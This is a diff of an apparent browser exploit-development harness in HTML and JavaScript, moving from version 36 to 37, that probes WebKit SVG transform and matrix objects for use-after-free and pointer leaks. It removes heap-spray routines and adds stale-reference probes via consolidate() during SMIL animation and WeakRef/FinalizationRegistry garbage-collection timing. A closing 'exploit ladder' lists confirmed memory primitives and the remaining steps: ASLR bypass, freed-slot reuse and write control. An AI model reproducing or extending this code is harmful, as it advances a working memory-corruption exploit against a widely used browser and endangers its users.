-      for(var i=0;i<Math.min(5,bv.numberOfItems);i++){
-        var bvN=bv.getItem(i);
-        var avN=av.getItem(i);
-        var weird=false;
-        var p=classifyPtr(avN.value);
-        if(p||isWeird(avN.value))weird=true;
-        caSamples.push({t:elapsed,idx:i,av:avN.value,bv:bvN.value,split:split,weird:weird});
+      var avList=r.transform.animVal;
+      if(avList.numberOfItems>0){
+        var tx=avList.getItem(0);
+        frameRefs.push(tx);
+        frameVals.push(tx.matrix.e);
+        frameCount++;
       }
     }catch(e){}
-    requestAnimationFrame(caSample);
+    requestAnimationFrame(captureFrame);
   }
 
-  setTimeout(function(){requestAnimationFrame(caSample);},100);
+  setTimeout(function(){requestAnimationFrame(captureFrame);},50);
 }
 
 // ════════════════════════════════════════════════════════════════════════
-// SP — spray-then-read: allocate many SVGTransforms, fill with pattern,
-// then read back via detached refs to see if realloc gives old data
-// extended from UA — more spray types, different object sizes
+// CM — consolidate() mid-animation
+// during active SMIL animation, call consolidate() on the baseVal list
+// this may cause a mismatch between animVal (animation machinery's list)
+// and baseVal (the consolidated single transform)
 // ════════════════════════════════════════════════════════════════════════
-function runSP(){
-  hdr('SP: spray-then-read multi-type object reuse');
+function runCM(){
+  hdr('CM: consolidate() mid-animation state probe');
   var svg=mkSVG(200,200);
 
-  // SP[1]: SVGTransform spray — 1000 objects, fill, null refs, spray again
-  hdr('SP[1]: SVGTransform spray — reuse slot read');
-  var wave1=[];
-  var canary1=fromHiLo(0xDEAD0001,0xBEEF0001);
-  for(var i=0;i<256;i++){
-    var st=svg.createSVGTransform();
-    st.matrix.e=canary1;
-    st.matrix.f=canary1;
-    wave1.push(st);
+  // create element with multi-step transform
+  var r=mkEl(svg,'rect',{x:'0',y:'0',width:'20',height:'20',fill:'green'});
+  r.setAttribute('transform','translate(10,20) rotate(45) scale(2)');
+
+  // start animation on this element
+  var anim=mkEl(r,'animateTransform',{
+    attributeName:'transform',
+    type:'translate',
+    from:'0 0',
+    to:'100 0',
+    dur:'1s',
+    additive:'sum',
+    repeatCount:'indefinite'
+  });
+
+  // CM[1]: read animVal BEFORE consolidate
+  hdr('CM[1]: state before consolidate during animation');
+  var preBV_n=r.transform.baseVal.numberOfItems;
+  var preAV_n=r.transform.animVal.numberOfItems;
+  log('CM[1]: before consolidate: baseVal.n='+preBV_n+' animVal.n='+preAV_n,'info');
+
+  // save animVal transform refs
+  var avRefs=[];
+  for(var i=0;i<preAV_n;i++){
+    try{avRefs.push(r.transform.animVal.getItem(i));}catch(e){}
   }
-  // keep refs to some for reading later
-  var readSet=wave1.slice(0,16);
 
-  // null out the rest and hope GC collects
-  wave1=null;
-  var pressure=[];
-  for(var i=0;i<2000;i++)pressure.push(new Float64Array(512));
-  pressure=null;
+  // read their values now
+  var preVals=avRefs.map(function(ref){
+    try{return{e:ref.matrix.e,f:ref.matrix.f};}catch(e){return null;}
+  });
 
-  // spray wave 2 with different value
-  var sprayVal2=fromHiLo(0xFEEDC0DE,0xDEADFACE);
-  var wave2=[];
-  for(var i=0;i<256;i++){
-    var st2=svg.createSVGTransform();
-    st2.matrix.e=sprayVal2;
-    wave2.push(st2);
+  // CM[2]: consolidate baseVal mid-animation
+  hdr('CM[2]: consolidate() on baseVal during active animation');
+  try{r.transform.baseVal.consolidate();}catch(e){
+    log('CM[2]: consolidate threw: '+e,'warn');
   }
 
-  // read the refs from wave1 that we kept
+  var postBV_n=r.transform.baseVal.numberOfItems;
+  var postAV_n=r.transform.animVal.numberOfItems;
+  log('CM[2]: after consolidate: baseVal.n='+postBV_n+' animVal.n='+postAV_n,
+    postAV_n!==preAV_n?'star — ANIMVAL COUNT CHANGED AFTER CONSOLIDATE: '+preAV_n+'→'+postAV_n:
+    'info — animVal count unchanged');
+
+  // CM[3]: read old animVal refs after consolidate
+  hdr('CM[3]: stale animVal refs after consolidate');
   var changedCount=0;
-  readSet.forEach(function(ref,i){
-    var v=null;
-    try{v=ref.matrix.e;}catch(e){v='THROWS';}
-    if(typeof v==='number'&&v!==canary1){
+  avRefs.forEach(function(ref,i){
+    if(!preVals[i])return;
+    var nowE=null;
+    try{nowE=ref.matrix.e;}catch(e){nowE='THROWS: '+e.name;}
+    var nowF=null;
+    try{nowF=ref.matrix.f;}catch(e){nowF='THROWS';}
+    if(nowE!==preVals[i].e){
       changedCount++;
-      var p=classifyPtr(v);
-      log('SP[1]: readSet['+i+'] changed: was=canary1 now='+f64hex(v),
-        v===sprayVal2?'uaf — SPRAY2 VALUE IN OLD REF: UAF CONFIRMED!':
-        p?'ptr — POINTER IN OLD REF! type='+p.type:
-        'crit — UNEXPECTED VALUE: '+f64hex(v));
+      var p=classifyPtr(typeof nowE==='number'?nowE:null);
+      log('CM[3]: avRef['+i+'] CHANGED: before='+f64hex(preVals[i].e)+' after='+f64hex(nowE),
+        p?'aslr — POINTER IN STALE ANIMVAL REF! type='+p.type:
+        'crit — VALUE CHANGED AFTER CONSOLIDATE: '+f64hex(nowE));
     }
   });
-  log('SP[1]: '+changedCount+'/'+readSet.length+' refs changed after spray',
-    changedCount>0?'crit — SOME REFS CHANGED: HEAP REUSE DETECTED!':'info — all refs stable (ARC protecting)');
+  log('CM[3]: '+changedCount+'/'+avRefs.length+' animVal refs changed after consolidate',
+    changedCount>0?'crit — STALE ANIMVAL DETECTED!':'info — all stable');
 
-  // SP[2]: SVGMatrix spray — different object type/size
-  hdr('SP[2]: SVGMatrix spray and read');
-  var mxWave1=[];
-  var mxCanary=fromHiLo(0xAAAA1234,0xBBBB5678);
-  for(var i=0;i<256;i++){
-    var mx=svg.createSVGMatrix();
-    mx.e=mxCanary; mx.f=mxCanary; mx.a=mxCanary;
-    mxWave1.push(mx);
-  }
-  var mxReadSet=mxWave1.slice(0,16);
-  mxWave1=null;
-  var p2=[];for(var i=0;i<2000;i++)p2.push(new Float64Array(512));p2=null;
-
-  var mxSpray=fromHiLo(0xDEAD5678,0xFEED1234);
-  var mxWave2=[];
-  for(var i=0;i<256;i++){
-    var mx2=svg.createSVGMatrix();mx2.e=mxSpray;mxWave2.push(mx2);
-  }
-
-  var mxChanged=0;
-  mxReadSet.forEach(function(ref,i){
-    var v=null;
-    try{v=ref.e;}catch(e){v='THROWS';}
-    if(typeof v==='number'&&v!==mxCanary){
-      mxChanged++;
-      var p=classifyPtr(v);
-      log('SP[2]: mxReadSet['+i+'] changed: now='+f64hex(v),
-        v===mxSpray?'uaf — MATRIX SPRAY UAF!':p?'ptr — POINTER LEAK!':'crit — '+f64hex(v));
+  // CM[4]: now read a NEW animVal item — does it reflect consolidated state?
+  hdr('CM[4]: new animVal read after consolidate');
+  setTimeout(function(){
+    var newAV=r.transform.animVal;
+    log('CM[4]: new animVal.numberOfItems='+newAV.numberOfItems,'info');
+    if(newAV.numberOfItems>0){
+      var newTX=newAV.getItem(0);
+      log('CM[4]: new animVal[0].matrix.e='+f64hex(newTX.matrix.e)+
+        ' f='+f64hex(newTX.matrix.f),'info');
     }
-  });
-  log('SP[2]: '+mxChanged+'/'+mxReadSet.length+' matrix refs changed',
-    mxChanged>0?'crit — MATRIX REFS CHANGED!':'info — stable');
-
-  // SP[3]: cross-type confusion spray
-  // spray SVGMatrix, then spray SVGTransform at same size, read old SVGMatrix refs
-  hdr('SP[3]: cross-type spray — SVGMatrix slot reused by SVGTransform?');
-  var crossMx=[];
-  var crossCanary=fromHiLo(0xC0FFEE00,0xC0FFEE00);
-  for(var i=0;i<256;i++){
-    var cm=svg.createSVGMatrix();
-    cm.e=crossCanary;
-    crossMx.push(cm);
-  }
-  var crossRead=crossMx.slice(0,8);
-  crossMx=null;
-  var p3=[];for(var i=0;i<2000;i++)p3.push(new Float64Array(512));p3=null;
-
-  // spray with SVGTransform instead
-  var crossSpray=fromHiLo(0xBADC0DE0,0xBADC0DE0);
-  var crossTx=[];
-  for(var i=0;i<256;i++){
-    var ctx=svg.createSVGTransform();ctx.matrix.e=crossSpray;crossTx.push(ctx);
-  }
-  var crossChanged=0;
-  crossRead.forEach(function(ref,i){
-    var v=null;
-    try{v=ref.e;}catch(e){v='THROWS';}
-    if(typeof v==='number'&&v!==crossCanary){
-      crossChanged++;
-      log('SP[3]: cross['+i+'] changed: now='+f64hex(v),
-        'crit — CROSS-TYPE SLOT REUSE: '+f64hex(v));
-    }
-  });
-  log('SP[3]: cross-type '+crossChanged+'/'+crossRead.length+' refs changed',
-    crossChanged>0?'uaf — CROSS-TYPE REUSE DETECTED!':'info');
-
-  svg.remove();
-  prog('SP done');
+    anim.remove();
+    svg.remove();
+    prog('CM done');
+  },500);
 }
 
 // ════════════════════════════════════════════════════════════════════════
-// SU — summary + assessment
+// WR — WeakRef + FinalizationRegistry UAF attempt
+// JS WeakRef allows holding a ref to an object WITHOUT preventing GC
+// FinalizationRegistry fires when the object is collected
+// Use WeakRef to hold SVGMatrix without preventing GC
+// then confirm GC happened (via registry callback) and read the WeakRef
+// ════════════════════════════════════════════════════════════════════════
+function runWR(){
+  hdr('WR: WeakRef + FinalizationRegistry UAF');
+  var svg=mkSVG(200,200);
+
+  // WR[1]: check WeakRef availability
+  hdr('WR[1]: WeakRef / FinalizationRegistry availability');
+  var hasWeakRef=(typeof WeakRef!=='undefined');
+  var hasRegistry=(typeof FinalizationRegistry!=='undefined');
+  log('WR[1]: WeakRef='+hasWeakRef+' FinalizationRegistry='+hasRegistry,'info');
+
+  if(!hasWeakRef){
+    log('WR[1]: WeakRef unavailable — skipping WR suite','warn');
+    svg.remove();
+    prog('WR done (unavailable)');
+    return;
+  }
+
+  // WR[2]: SVGMatrix via WeakRef — does it survive GC?
+  hdr('WR[2]: SVGMatrix in WeakRef — GC survival test');
+  var canary=fromHiLo(0xDEADBEEF,0xCAFEBABE);
+  var gcFired=false;
+  var reg=hasRegistry?new FinalizationRegistry(function(val){
+    gcFired=true;
+    log('WR[2]: FinalizationRegistry fired! token='+val,'crit — GC COLLECTED THE MATRIX!');
+    // try to read the WeakRef NOW — object being collected
+    var deref=mxWeakRef.deref();
+    if(deref){
+      log('WR[2]: deref AFTER GC callback: e='+f64hex(deref.e),
+        'uaf — WEAKREF READABLE DURING COLLECTION: UAF WINDOW!');
+    } else {
+      log('WR[2]: deref returned undefined after GC (expected)','info');
+    }
+  }):null;
+
+  var mxWeakRef=null;
+  (function(){
+    var mx=svg.createSVGMatrix();
+    mx.e=canary; mx.f=canary; mx.a=canary;
+    mxWeakRef=new WeakRef(mx);
+    if(reg)reg.register(mx,'SVGMatrix-canary');
+    // mx goes out of scope here
+  })();
+
+  // WR[3]: check deref before GC
+  var prePressure=mxWeakRef.deref();
+  log('WR[3]: before GC pressure: deref alive='+(prePressure!==undefined)+
+    (prePressure?' e='+f64hex(prePressure.e):''),'info');
+
+  // apply massive GC pressure
+  for(var i=0;i<50;i++){
+    var p=[];
+    for(var j=0;j<1000;j++)p.push(new Float64Array(1024));
+    p=null;
+  }
+
+  // check after pressure
+  var postPressure=mxWeakRef.deref();
+  log('WR[3]: after GC pressure: deref alive='+(postPressure!==undefined)+
+    (postPressure?' e='+f64hex(postPressure.e):'')+'  gcFired='+gcFired,
+    postPressure===undefined&&!gcFired?'star — DEREF CLEARED BUT NO GC CALLBACK: object freed!':
+    postPressure===undefined&&gcFired?'info — GC collected, registry fired as expected':
+    postPressure!==undefined?'info — object still alive (ARC): e='+f64hex(postPressure.e):'info');
+
+  // WR[4]: SVGTransform WeakRef
+  hdr('WR[4]: SVGTransform in WeakRef — GC survival');
+  var txWeakRef=null;
+  var txCanary=fromHiLo(0x12345678,0x9ABCDEF0);
+  (function(){
+    var tx=svg.createSVGTransform();
+    tx.matrix.e=txCanary;
+    txWeakRef=new WeakRef(tx);
+    if(reg)reg.register(tx,'SVGTransform-canary');
+  })();
+
+  for(var i=0;i<50;i++){
+    var p2=[];
+    for(var j=0;j<1000;j++)p2.push(new Float64Array(1024));
+    p2=null;
+  }
+
+  var txDeref=txWeakRef.deref();
+  log('WR[4]: SVGTransform deref after GC: alive='+(txDeref!==undefined)+
+    (txDeref?' e='+f64hex(txDeref.matrix.e):''),
+    txDeref===undefined?'star — SVGTransform GC collected via WeakRef!':
+    'info — still alive via ARC: e='+f64hex(txDeref.matrix.e));
+
+  svg.remove();
+  prog('WR done');
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// SU — final summary + assessment
 // ════════════════════════════════════════════════════════════════════════
 function runSU(){
-  hdr('SU: v36 assessment');
+  hdr('SU: v37 final summary');
 
   var svg=mkSVG(200,200);
 
-  // SU[1]: SVGMatrix.translate/scale return value — new objects, uninitialized?
-  hdr('SU[1]: SVGMatrix.translate/scale return — new object fields');
-  var mx=svg.createSVGMatrix();
-  mx.e=fromHiLo(0x12345678,0x9ABCDEF0);
-  var t=null;
-  try{t=mx.translate(100,200);}catch(e){}
-  if(t){
-    ['a','b','c','d','e','f'].forEach(function(f){
-      var v=t[f];
-      var p=classifyPtr(v);
-      if(p||isWeird(v)){
-        log('SU[1]: translate result.'+f+'='+f64hex(v),
-          p?'ptr — POINTER IN TRANSLATE RESULT! type='+p.type:'warn — '+v);
-      }
-    });
-    log('SU[1]: translate(100,200): e='+t.e+' f='+t.f,'info');
-  }
+  // SU[1]: SVGAnimatedTransformList — the animVal list itself
+  hdr('SU[1]: SVGAnimatedTransformList — read raw list object fields');
+  var r=mkEl(svg,'rect',{x:'0',y:'0',width:'10',height:'10'});
+  r.setAttribute('transform','matrix(1 0 0 1 0 0)');
+  var animTxList=r.transform;
+  // animTxList is SVGAnimatedTransformList — has baseVal + animVal
+  log('SU[1]: r.transform type='+Object.prototype.toString.call(animTxList),'info');
 
-  // SU[2]: SVGRect from SVGSVGElement.createSVGRect
-  hdr('SU[2]: createSVGRect — raw fields');
-  var rect=null;
-  try{rect=svg.createSVGRect();}catch(e){}
-  if(rect){
-    ['x','y','width','height'].forEach(function(f){
-      var v=rect[f];
-      var p=classifyPtr(v);
-      if(p||isWeird(v)){
-        log('SU[2]: createSVGRect.'+f+'='+f64hex(v),
-          p?'ptr — POINTER IN RECT! type='+p.type:'warn — '+v);
-      }
-    });
-    log('SU[2]: rect: x='+rect.x+' y='+rect.y+' w='+rect.width+' h='+rect.height,'info');
-  }
+  // SU[2]: SVGTransform.type mutation probe — set scale then read as matrix
+  hdr('SU[2]: SVGTransform.setScale() then read all matrix fields');
+  var r2=mkEl(svg,'rect',{x:'0',y:'0',width:'10',height:'10'});
+  r2.setAttribute('transform','matrix(1 0 0 1 0 0)');
+  var tx2=r2.transform.baseVal.getItem(0);
+  tx2.matrix.e=fromHiLo(0xDEAD1234,0x5678DEAD);
+  tx2.matrix.b=fromHiLo(0xAAAAAAAA,0xAAAAAAAA);
+  tx2.setScale(3,7);  // type changes from MATRIX to SCALE
+  ['a','b','c','d','e','f'].forEach(function(f){
+    var v=tx2.matrix[f];
+    var p=classifyPtr(v);
+    if(p||isWeird(v)){
+      log('SU[2]: post-setScale matrix.'+f+'='+f64hex(v),
+        p?'ptr — POINTER AFTER setScale! type='+p.type:'warn — '+v);
+    }
+  });
+  log('SU[2]: after setScale(3,7): a='+tx2.matrix.a+' d='+tx2.matrix.d+
+    ' e='+tx2.matrix.e+' f='+tx2.matrix.f,'info');
 
-  // SU[3]: SVGNumber — raw value
-  hdr('SU[3]: createSVGNumber raw value');
-  var num=null;
-  try{num=svg.createSVGNumber();}catch(e){}
-  if(num){
-    var p=classifyPtr(num.value);
-    log('SU[3]: createSVGNumber.value='+f64hex(num.value),
-      p?'ptr — POINTER IN SVGNumber!':'info — value='+num.value);
-  }
-
-  // SU[4]: overall status
-  hdr('SU[4]: overall exploit ladder status');
-  log('SU[4]: confirmed:','info');
-  log('SU[4]:   ✅ CTM unclamped f64 write/read primitive','pass');
-  log('SU[4]:   ✅ viewBox amplification (bypasses LayoutUnit)','pass');
-  log('SU[4]:   ✅ 2^31 branch switch oracle','pass');
-  log('SU[4]:   ✅ SVGMatrix on WebCore native heap (GC-stable)','pass');
-  log('SU[4]:   ✅ animVal/baseVal genuine split during SMIL animation','pass');
-  log('SU[4]:   ✅ replaceItem keeps detached ref alive (ARC-stable)','pass');
-  log('SU[4]: still needed:','warn');
-  log('SU[4]:   ❌ ASLR leak / pointer from raw read','warn');
-  log('SU[4]:   ❌ Freed slot reuse (UAF — ARC preventing so far)','warn');
-  log('SU[4]:   ❌ Control of write destination','warn');
+  // SU[3]: status table
+  hdr('SU[3]: full exploit ladder status v37');
+  log('SU[3]: confirmed primitives:','info');
+  log('SU[3]:   ✅ CTM unclamped f64 write/read (no ceiling, tracks to F64_MAX)','pass');
+  log('SU[3]:   ✅ viewBox amplification (bypasses LayoutUnit clamping)','pass');
+  log('SU[3]:   ✅ 2^31 branch switch oracle (BCR behavior divergence)','pass');
+  log('SU[3]:   ✅ SVGMatrix on WebCore native heap (GC-stable, fixed addr)','pass');
+  log('SU[3]:   ✅ animVal/baseVal genuine split (SMIL + CSS animation)','pass');
+  log('SU[3]:   ✅ detached refs ARC-stable (replaceItem/removeItem)','pass');
+  log('SU[3]: still needed:','warn');
+  log('SU[3]:   ❌ Pointer leak from raw read (ASLR bypass)','warn');
+  log('SU[3]:   ❌ Freed slot reuse (ARC blocks JS-only UAF)','warn');
+  log('SU[3]:   ❌ Writable destination address','warn');
+  log('SU[3]: v37 new vectors:','info');
+  log('SU[3]:   → SH: use shadow tree teardown (source → use cascade)','info');
+  log('SU[3]:   → IL: getIntersectionList/getEnclosureList dangling items','info');
+  log('SU[3]:   → AR: animVal transform object per-frame allocation','info');
+  log('SU[3]:   → CM: consolidate() mid-animation animVal stale ref','info');
+  log('SU[3]:   → WR: WeakRef + FinalizationRegistry (true GC timing)','info');
 
   svg.remove();
-  prog('SU done — v36 complete');
+  prog('SU done — v37 complete');
 }
 </script>
 </body>
